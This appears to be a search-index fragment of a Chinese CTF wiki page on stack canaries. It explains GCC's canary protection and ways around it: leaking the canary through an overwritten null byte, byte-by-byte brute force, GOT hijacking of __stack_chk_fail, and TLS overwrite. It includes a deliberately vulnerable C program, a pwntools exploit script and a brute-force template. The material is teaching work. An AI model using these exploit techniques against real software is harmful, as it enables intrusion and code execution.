\u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4bcanary\u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8, \u4ee5\u6b64\u6765\u5224\u65adstack/buffer overflow\u662f\u5426\u53d1\u751f\u3002 Canary\u4e0ewindows\u4e0b\u7684GS\u4fdd\u62a4\u90fd\u662f\u9632\u6b62\u6808\u6ea2\u51fa\u7684\u6709\u6548\u624b\u6bb5\uff0c\u51e0\u4e4e\u5e76\u4e0d\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\uff0c\u6240\u4ee5\u73b0\u5728\u6210\u4e86linux\u4e0b\u4fdd\u62a4\u673a\u5236\u7684\u6807\u914d\u3002 \u5728GCC\u4e2d\u4f7f\u7528Canary \u00b6 \u5728GCC\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u8bbe\u7f6eCanary: -fstack-protector \u542f\u7528\u4fdd\u62a4\uff0c\u4e0d\u8fc7\u53ea\u4e3a\u5c40\u90e8\u53d8\u91cf\u4e2d\u542b\u6709\u6570\u7ec4\u7684\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 -fstack-protector-all \u542f\u7528\u4fdd\u62a4\uff0c\u4e3a\u6240\u6709\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 -fstack-protector-strong -fstack-protector-explicit \u53ea\u5bf9\u6709\u660e\u786estack_protect attribute\u7684\u51fd\u6570\u5f00\u542f\u4fdd\u62a4 -fno-stack-protector \u7981\u7528\u4fdd\u62a4. Canary\u5b9e\u73b0\u539f\u7406 \u00b6 \u5f53\u7a0b\u5e8f\u542f\u7528Canary\u7f16\u8bd1\u540e\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u53d6fs\u5bc4\u5b58\u56680x28\u5904\u7684\u503c\uff0c\u5b58\u5230EBP - 0x4(32\u4f4d)\u6216RBP - 0x8(64\u4f4d)\u7684\u4f4d\u7f6e\u3002 \u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u5411\u6808\u4e2d\u63d2\u5165Canary\u503c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax Canary\u4fdd\u62a4\u7684stack\u7ed3\u6784\u5927\u6982\u5982\u4e0b(64\u4f4d)\uff1a High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | \u5c40\u90e8\u53d8\u91cf | Low | | Address \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u5e76\u4e0e fs:0x28 \u7684\u503c\u8fdb\u884c\u5f02\u6216\u3002\u5982\u679c\u5f02\u6216\u7684\u7ed3\u679c\u4e3a 0\uff0c\u8bf4\u660e canary \u672a\u88ab\u4fee\u6539\uff0c\u51fd\u6570\u4f1a\u6b63\u5e38\u8fd4\u56de\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u68c0\u6d4b\u662f\u5426\u53d1\u751f\u6808\u6ea2\u51fa\u3002 xor rdx,QWORD PTR fs:0x28 je 0x4005d7 <main+65> call 0x400460 <__stack_chk_fail@plt> \u5982\u679c canary \u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230 __stack_chk_fail \u3002 __stack_chk_fail \u4e5f\u662f\u4f4d\u4e8e glibc \u4e2d\u7684\u51fd\u6570\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7ecf\u8fc7 ELF \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u3002 \u8fd9\u610f\u5473\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 __stack_chk_fail \u7684 got \u503c\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5229\u7528 __stack_chk_fail \u6cc4\u6f0f\u5185\u5bb9 \u3002 \u8fdb\u4e00\u6b65\uff0c\u5bf9\u4e8e Linux \u6765\u8bf4\uff0cfs \u5bc4\u5b58\u5668\u5b9e\u9645\u6307\u5411\u7684\u662f\u5f53\u524d\u6808\u7684 TLS \u7ed3\u6784\uff0cfs:0x28 \u6307\u5411\u7684\u6b63\u662f stack_guard\u3002\u5982\u679c\u5b58\u5728\u6ea2\u51fa\u53ef\u4ee5\u8986\u76d6\u4f4d\u4e8e TLS \u4e2d\u4fdd\u5b58\u7684 Canary \u503c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7\u4fdd\u62a4\u673a\u5236\u3002 \u4e8b\u5b9e\u4e0a\uff0cTLS \u4e2d\u7684\u503c\u7531\u51fd\u6570 security_init \u8fdb\u884c\u521d\u59cb\u5316\u3002 static void security_init (void) { // _dl_random\u7684\u503c\u5728\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7531kernel\u5199\u5165. // glibc\u76f4\u63a5\u4f7f\u7528\u4e86_dl_random\u7684\u503c\u5e76\u6ca1\u6709\u7ed9\u8d4b\u503c // \u5982\u679c\u4e0d\u91c7\u7528\u8fd9\u79cd\u6a21\u5f0f, glibc\u4e5f\u53ef\u4ee5\u81ea\u5df1\u4ea7\u751f\u968f\u673a\u6570 //\u5c06_dl_random\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // \u8bbe\u7f6eCanary\u7684\u503c\u5230TLS\u4e2d THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL; } //THREAD_SET_STACK_GUARD\u5b8f\u7528\u4e8e\u8bbe\u7f6eTLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) Canary\u7ed5\u8fc7\u6280\u672f \u00b6 \u6cc4\u9732\u6808\u4e2d\u7684Canary \u00b6 Canary \u8bbe\u8ba1\u4e3a\u4ee5\u5b57\u8282 \\x00 \u7ed3\u5c3e\uff0c\u672c\u610f\u662f\u4e3a\u4e86\u4fdd\u8bc1 Canary \u53ef\u4ee5\u622a\u65ad\u5b57\u7b26\u4e32\uff0c\u7b80\u5355\u70b9\u8bf4\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u88ab printf \u7b49\u8f93\u51fa\u51fd\u6570\u8f93\u51fa\uff0c\u9632\u6b62\u6cc4\u9732\u3002 \u6cc4\u9732\u6808\u4e2d\u7684 Canary \u7684\u601d\u8def\u662f\u8986\u76d6 Canary \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\"\\x00\"\uff0c\u6765\u6253\u5370\u51fa\u5269\u4f59\u7684 Canary \u90e8\u5206\u3002 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u9700\u8981\u5b58\u5728\u5408\u9002\u7684**\u8f93\u51fa\u51fd\u6570**\uff0c\u6216\u8005\u901a\u8fc7**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32**\u6cc4\u6f0f\u3002\u5e76\u4e14\u53ef\u80fd\u9700\u8981\u7b2c\u4e00\u6b21\u6ea2\u51fa\u6cc4\u9732 Canary\uff0c\u4e4b\u540e\u518d\u6b21\u6ea2\u51fa\u6062\u590d Canary \u6700\u540e\u4e00\u4f4d\uff0c\u624d\u80fd\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002\u4e3e\u4e2a\u4f8b\u5b50\u6765\u8bf4\uff1a\u60f3\u63a7\u5236 vul() \u51fd\u6570\u6267\u884c\u6d41\u7a0b\uff0c\u9700\u8981\u5728 vul() \u5185\u6ea2\u51fa\u4e24\u6b21\u3002 \u5229\u7528\u793a\u4f8b \u7f16\u8bd1\u4e3a 32bit \u7a0b\u5e8f\uff0c\u5f00\u542f NX\uff0cASLR\uff0cCanary \u4fdd\u62a4 // ex2.c #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } void vuln () { char buf [ 100 ]; for ( int i = 0 ; i < 2 ; i ++ ){ read ( 0 , buf , 0x200 ); printf ( buf ); } } int main ( void ) { init (); puts ( \"Hello Hacker!\" ); vuln (); return 0 ; } \u9996\u5148\u901a\u8fc7\u8986\u76d6 Canary \u6700\u540e\u4e00\u4e2a \\x00 \u5b57\u8282\u6765\u6253\u5370\u51fa 4 \u4f4d\u7684 Canary \u4e4b\u540e\uff0c\u8ba1\u7b97\u597d\u504f\u79fb\uff0c\u5c06 Canary \u586b\u5165\u5230\u76f8\u5e94\u7684\u6ea2\u51fa\u4f4d\u7f6e\uff0c\u5b9e\u73b0 Ret \u5230 getshell \u51fd\u6570\u4e2d #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( './ex2' ) get_shell = ELF ( \"./ex2\" ) . sym [ \"getshell\" ] io . recvuntil ( \"Hello Hacker! \\n \" ) # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( \"A\" * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) # Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) io . send ( payload ) io . recv () io . interactive () \u9010\u5b57\u8282\u7206\u7834Canary \u00b6 \u6bcf\u6b21\u8fdb\u7a0b\u91cd\u542f\u540e\u7684 Canary \u4e0d\u540c\uff0c\u4f46\u662f\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u4e0d\u540c\u7ebf\u7a0b\u7684 Canary \u662f\u76f8\u540c\u7684\uff0c\u5e76\u4e14 \u901a\u8fc7 fork \u51fd\u6570\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u7684 Canary \u4e5f\u662f\u76f8\u540c\u7684\uff0c\u56e0\u4e3a fork \u51fd\u6570\u4f1a\u76f4\u63a5\u62f7\u8d1d\u7236\u8fdb\u7a0b\u7684\u5185\u5b58\uff0c\u5c31\u662f\u5b50\u8fdb\u7a0b\u4f1a\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684Canary\u3002 \u5f53\u6211\u4eec\u5b50\u8fdb\u7a0b\u7531\u4e8eCanary\u5224\u65ad\u4e0d\u6b63\u786e\u5bfc\u81f4\u7a0b\u5e8fcrash\uff08\u5d29\u6e83\uff09\u540e\uff0c\u7236\u8fdb\u7a0b\u4e0d\u4f1aCrash\u3002\u5229\u7528\u8fd9\u6837\u7684\u7279\u70b9\uff0c\u5f7b\u5e95\u9010\u4e2a\u5b57\u8282\u5c06Canary\u7206\u7834\u51fa\u6765\uff0c\u7206\u7834\u6a21\u677f\u5982\u4e0b\uff1a print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary \u52ab\u6301__stack_chk_fail \u51fd\u6570 \u00b6 \u5df2\u77e5 Canary \u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230 __stack_chk_fail ed \u51fd\u6570\uff0c __stack_chk_fail ed \u51fd\u6570\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 GOT \u8868\u52ab\u6301\u8fd9\u4e2a\u51fd\u6570\u3002 \u4f8b\u9898 \u53c2\u89c1 ZCTF2017 Login\uff0c\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7 fsb \u6f0f\u6d1e\u7be1\u6539 __stack_chk_fail \u7684 GOT \u8868\uff0c\u518d\u8fdb\u884c ROP \u5229\u7528 xman babystack \u8986\u76d6 TLS \u4e2d\u50a8\u5b58\u7684 Canary \u503c \u00b6 \u5df2\u77e5 Canary \u50a8\u5b58\u5728 TLS \u4e2d\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u503c\u8fdb\u884c\u5bf9\u6bd4\u3002\u5f53\u6ea2\u51fa\u5c3a\u5bf8\u8f83\u5927\u65f6\uff0c\u53ef\u4ee5\u540c\u65f6\u8986\u76d6\u6808\u4e0a\u50a8\u5b58\u7684 Canary \u548c TLS \u50a8\u5b58\u7684 Canary \u5b9e\u73b0\u7ed5\u8fc7\u3002 \u4f8b\u9898 StarCTF2018 babystack \u7ed5\u8fc7canary \u00b6 \u8fd9\u79cd\u64cd\u4f5c\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9\u4ed6\u4e0d\u6267\u884ccanary\u7684\u62a5\u9519\u6216\u8005\u76f4\u63a5\u8df3\u8fc7canary\u7684\u68c0\u67e5\u3002 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6216\u8005\u6570\u7ec4\u4e0b\u6807\u8d8a\u754c\uff0c\u53ef\u4ee5\u6808\u5730\u5740\u4efb\u610f\u8bfb\u5199\uff0c\u4e0d\u5fc5**\u8fde\u7eed**\u5411\u6808\u4e0a\u5199\uff0c\u76f4\u63a5\u5199ebp\u548cret\u56e0\u6b64\u4e0d\u4f1a\u89e6\u53d1Canary\u68c0\u67e5\u3002\u4e5f\u5c31\u662f\u4e0d\u8986\u5199canary\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 [1] ctf-wiki. canary-zh [2] 23R3F. PWN\u4e4bcanary\u9a9a\u64cd\u4f5c","title":"Canary"},{"location":"Pwn/stackoverflow/Canary/#canary","text":"","title":"Canary"},{"location":"Pwn/stackoverflow/Canary/#canary_1","text":"\u7531\u4e8e\u6808\u6ea2\u51fa(stack overflow)\u800c\u5f15\u53d1\u7684\u653b\u51fb\u975e\u5e38\u666e\u904d\u4e5f\u975e\u5e38\u53e4\u8001, \u76f8\u5e94\u5730\u4e00\u79cd\u53eb\u505acanary\u5c31\u51fa\u73b0\u5728gcc/glibc\u91cc, \u76f4\u5230\u73b0\u5728\u4e5f\u4f5c\u4e3a\u7cfb\u7edf\u5b89\u5168\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\u5b58\u5728\u3002 canary \u5b9e\u73b0\u548c\u8bbe\u8ba1\u601d\u60f3\u90fd\u6bd4\u8f83\u7b80\u5355, \u5c31\u662f\u63d2\u5165\u4e00\u4e2a\u503c, \u5728stack overflow\u53d1\u751f\u7684\u9ad8\u5371\u533a\u57df\u7684\u6808\u7a7a\u95f4\u5c3e\u90e8, \u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4bcanary\u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8, \u4ee5\u6b64\u6765\u5224\u65adstack/buffer overflow\u662f\u5426\u53d1\u751f\u3002 Canary\u4e0ewindows\u4e0b\u7684GS\u4fdd\u62a4\u90fd\u662f\u9632\u6b62\u6808\u6ea2\u51fa\u7684\u6709\u6548\u624b\u6bb5\uff0c\u51e0\u4e4e\u5e76\u4e0d\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\uff0c\u6240\u4ee5\u73b0\u5728\u6210\u4e86linux\u4e0b\u4fdd\u62a4\u673a\u5236\u7684\u6807\u914d\u3002","title":"Canary\u662f\u4ec0\u4e48"},{"location":"Pwn/stackoverflow/Canary/#gcccanary","text":"\u5728GCC\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u8bbe\u7f6eCanary: -fstack-protector \u542f\u7528\u4fdd\u62a4\uff0c\u4e0d\u8fc7\u53ea\u4e3a\u5c40\u90e8\u53d8\u91cf\u4e2d\u542b\u6709\u6570\u7ec4\u7684\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 -fstack-protector-all \u542f\u7528\u4fdd\u62a4\uff0c\u4e3a\u6240\u6709\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 -fstack-protector-strong -fstack-protector-explicit \u53ea\u5bf9\u6709\u660e\u786estack_protect attribute\u7684\u51fd\u6570\u5f00\u542f\u4fdd\u62a4 -fno-stack-protector \u7981\u7528\u4fdd\u62a4.","title":"\u5728GCC\u4e2d\u4f7f\u7528Canary"},{"location":"Pwn/stackoverflow/Canary/#canary_2","text":"\u5f53\u7a0b\u5e8f\u542f\u7528Canary\u7f16\u8bd1\u540e\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u53d6fs\u5bc4\u5b58\u56680x28\u5904\u7684\u503c\uff0c\u5b58\u5230EBP - 0x4(32\u4f4d)\u6216RBP - 0x8(64\u4f4d)\u7684\u4f4d\u7f6e\u3002 \u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u5411\u6808\u4e2d\u63d2\u5165Canary\u503c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax Canary\u4fdd\u62a4\u7684stack\u7ed3\u6784\u5927\u6982\u5982\u4e0b(64\u4f4d)\uff1a High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | \u5c40\u90e8\u53d8\u91cf | Low | | Address \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u5e76\u4e0e fs:0x28 \u7684\u503c\u8fdb\u884c\u5f02\u6216\u3002\u5982\u679c\u5f02\u6216\u7684\u7ed3\u679c\u4e3a 0\uff0c\u8bf4\u660e canary \u672a\u88ab\u4fee\u6539\uff0c\u51fd\u6570\u4f1a\u6b63\u5e38\u8fd4\u56de\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u68c0\u6d4b\u662f\u5426\u53d1\u751f\u6808\u6ea2\u51fa\u3002 xor rdx,QWORD PTR fs:0x28 je 0x4005d7 <main+65> call 0x400460 <__stack_chk_fail@plt> \u5982\u679c canary \u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230 __stack_chk_fail \u3002 __stack_chk_fail \u4e5f\u662f\u4f4d\u4e8e glibc \u4e2d\u7684\u51fd\u6570\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7ecf\u8fc7 ELF \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u3002 \u8fd9\u610f\u5473\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 __stack_chk_fail \u7684 got \u503c\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5229\u7528 __stack_chk_fail \u6cc4\u6f0f\u5185\u5bb9 \u3002 \u8fdb\u4e00\u6b65\uff0c\u5bf9\u4e8e Linux \u6765\u8bf4\uff0cfs \u5bc4\u5b58\u5668\u5b9e\u9645\u6307\u5411\u7684\u662f\u5f53\u524d\u6808\u7684 TLS \u7ed3\u6784\uff0cfs:0x28 \u6307\u5411\u7684\u6b63\u662f stack_guard\u3002\u5982\u679c\u5b58\u5728\u6ea2\u51fa\u53ef\u4ee5\u8986\u76d6\u4f4d\u4e8e TLS \u4e2d\u4fdd\u5b58\u7684 Canary \u503c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7\u4fdd\u62a4\u673a\u5236\u3002 \u4e8b\u5b9e\u4e0a\uff0cTLS \u4e2d\u7684\u503c\u7531\u51fd\u6570 security_init \u8fdb\u884c\u521d\u59cb\u5316\u3002 static void security_init (void) { // _dl_random\u7684\u503c\u5728\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7531kernel\u5199\u5165. // glibc\u76f4\u63a5\u4f7f\u7528\u4e86_dl_random\u7684\u503c\u5e76\u6ca1\u6709\u7ed9\u8d4b\u503c // \u5982\u679c\u4e0d\u91c7\u7528\u8fd9\u79cd\u6a21\u5f0f, glibc\u4e5f\u53ef\u4ee5\u81ea\u5df1\u4ea7\u751f\u968f\u673a\u6570 //\u5c06_dl_random\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // \u8bbe\u7f6eCanary\u7684\u503c\u5230TLS\u4e2d THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL; } //THREAD_SET_STACK_GUARD\u5b8f\u7528\u4e8e\u8bbe\u7f6eTLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)","title":"Canary\u5b9e\u73b0\u539f\u7406"},{"location":"Pwn/stackoverflow/Canary/#canary_3","text":"","title":"Canary\u7ed5\u8fc7\u6280\u672f"},{"location":"Pwn/stackoverflow/Canary/#canary_4","text":"Canary \u8bbe\u8ba1\u4e3a\u4ee5\u5b57\u8282 \\x00 \u7ed3\u5c3e\uff0c\u672c\u610f\u662f\u4e3a\u4e86\u4fdd\u8bc1 Canary \u53ef\u4ee5\u622a\u65ad\u5b57\u7b26\u4e32\uff0c\u7b80\u5355\u70b9\u8bf4\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u88ab printf \u7b49\u8f93\u51fa\u51fd\u6570\u8f93\u51fa\uff0c\u9632\u6b62\u6cc4\u9732\u3002 \u6cc4\u9732\u6808\u4e2d\u7684 Canary \u7684\u601d\u8def\u662f\u8986\u76d6 Canary \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\"\\x00\"\uff0c\u6765\u6253\u5370\u51fa\u5269\u4f59\u7684 Canary \u90e8\u5206\u3002 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u9700\u8981\u5b58\u5728\u5408\u9002\u7684**\u8f93\u51fa\u51fd\u6570**\uff0c\u6216\u8005\u901a\u8fc7**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32**\u6cc4\u6f0f\u3002\u5e76\u4e14\u53ef\u80fd\u9700\u8981\u7b2c\u4e00\u6b21\u6ea2\u51fa\u6cc4\u9732 Canary\uff0c\u4e4b\u540e\u518d\u6b21\u6ea2\u51fa\u6062\u590d Canary \u6700\u540e\u4e00\u4f4d\uff0c\u624d\u80fd\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002\u4e3e\u4e2a\u4f8b\u5b50\u6765\u8bf4\uff1a\u60f3\u63a7\u5236 vul() \u51fd\u6570\u6267\u884c\u6d41\u7a0b\uff0c\u9700\u8981\u5728 vul() \u5185\u6ea2\u51fa\u4e24\u6b21\u3002 \u5229\u7528\u793a\u4f8b \u7f16\u8bd1\u4e3a 32bit \u7a0b\u5e8f\uff0c\u5f00\u542f NX\uff0cASLR\uff0cCanary \u4fdd\u62a4 // ex2.c #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } void vuln () { char buf [ 100 ]; for ( int i = 0 ; i < 2 ; i ++ ){ read ( 0 , buf , 0x200 ); printf ( buf ); } } int main ( void ) { init (); puts ( \"Hello Hacker!\" ); vuln (); return 0 ; } \u9996\u5148\u901a\u8fc7\u8986\u76d6 Canary \u6700\u540e\u4e00\u4e2a \\x00 \u5b57\u8282\u6765\u6253\u5370\u51fa 4 \u4f4d\u7684 Canary \u4e4b\u540e\uff0c\u8ba1\u7b97\u597d\u504f\u79fb\uff0c\u5c06 Canary \u586b\u5165\u5230\u76f8\u5e94\u7684\u6ea2\u51fa\u4f4d\u7f6e\uff0c\u5b9e\u73b0 Ret \u5230 getshell \u51fd\u6570\u4e2d #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( './ex2' ) get_shell = ELF ( \"./ex2\" ) . sym [ \"getshell\" ] io . recvuntil ( \"Hello Hacker! \\n \" ) # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( \"A\" * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) # Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) io . send ( payload ) io . recv () io . interactive ()","title":"\u6cc4\u9732\u6808\u4e2d\u7684Canary"},{"location":"Pwn/stackoverflow/Canary/#canary_5","text":"\u6bcf\u6b21\u8fdb\u7a0b\u91cd\u542f\u540e\u7684 Canary \u4e0d\u540c\uff0c\u4f46\u662f\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u4e0d\u540c\u7ebf\u7a0b\u7684 Canary \u662f\u76f8\u540c\u7684\uff0c\u5e76\u4e14 \u901a\u8fc7 fork \u51fd\u6570\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u7684 Canary \u4e5f\u662f\u76f8\u540c\u7684\uff0c\u56e0\u4e3a fork \u51fd\u6570\u4f1a\u76f4\u63a5\u62f7\u8d1d\u7236\u8fdb\u7a0b\u7684\u5185\u5b58\uff0c\u5c31\u662f\u5b50\u8fdb\u7a0b\u4f1a\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684Canary\u3002 \u5f53\u6211\u4eec\u5b50\u8fdb\u7a0b\u7531\u4e8eCanary\u5224\u65ad\u4e0d\u6b63\u786e\u5bfc\u81f4\u7a0b\u5e8fcrash\uff08\u5d29\u6e83\uff09\u540e\uff0c\u7236\u8fdb\u7a0b\u4e0d\u4f1aCrash\u3002\u5229\u7528\u8fd9\u6837\u7684\u7279\u70b9\uff0c\u5f7b\u5e95\u9010\u4e2a\u5b57\u8282\u5c06Canary\u7206\u7834\u51fa\u6765\uff0c\u7206\u7834\u6a21\u677f\u5982\u4e0b\uff1a print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary","title":"\u9010\u5b57\u8282\u7206\u7834Canary"},{"location":"Pwn/stackoverflow/Canary/#__stack_chk_fail","text":"\u5df2\u77e5 Canary \u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230 __stack_chk_fail ed \u51fd\u6570\uff0c __stack_chk_fail ed \u51fd\u6570\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 GOT \u8868\u52ab\u6301\u8fd9\u4e2a\u51fd\u6570\u3002 \u4f8b\u9898 \u53c2\u89c1 ZCTF2017 Login\uff0c\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7 fsb \u6f0f\u6d1e\u7be1\u6539 __stack_chk_fail \u7684 GOT \u8868\uff0c\u518d\u8fdb\u884c ROP \u5229\u7528 xman babystack","title":"\u52ab\u6301__stack_chk_fail \u51fd\u6570"},{"location":"Pwn/stackoverflow/Canary/#tls-canary","text":"\u5df2\u77e5 Canary \u50a8\u5b58\u5728 TLS \u4e2d\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u503c\u8fdb\u884c\u5bf9\u6bd4\u3002\u5f53\u6ea2\u51fa\u5c3a\u5bf8\u8f83\u5927\u65f6\uff0c\u53ef\u4ee5\u540c\u65f6\u8986\u76d6\u6808\u4e0a\u50a8\u5b58\u7684 Canary \u548c TLS \u50a8\u5b58\u7684 Canary \u5b9e\u73b0\u7ed5\u8fc7\u3002 \u4f8b\u9898 StarCTF2018 babystack","title":"\u8986\u76d6 TLS \u4e2d\u50a8\u5b58\u7684 Canary \u503c"},{"location":"Pwn/stackoverflow/Canary/#canary_6","text":"\u8fd9\u79cd\u64cd\u4f5c\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9\u4ed6\u4e0d\u6267\u884ccanary\u7684\u62a5\u9519\u6216\u8005\u76f4\u63a5\u8df3\u8fc7canary\u7684\u68c0\u67e5\u3002 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6216\u8005\u6570\u7ec4\u4e0b\u6807\u8d8a\u754c\uff0c\u53ef\u4ee5\u6808\u5730\u5740\u4efb\u610f\u8bfb\u5199\uff0c\u4e0d\u5fc5**\u8fde\u7eed**\u5411\u6808\u4e0a\u5199\uff0c\u76f4\u63a5\u5199ebp\u548cret\u56e0\u6b64\u4e0d\u4f1a\u89e6\u53d1Canary\u68c0\u67e5\u3002\u4e5f\u5c31\u662f\u4e0d\u8986\u5199canary\u3002","title":"\u7ed5\u8fc7canary"},{"location":"Pwn/stackoverflow/Canary/#_1","text":"[1] ctf-wiki. canary-zh [2] 23R3F. 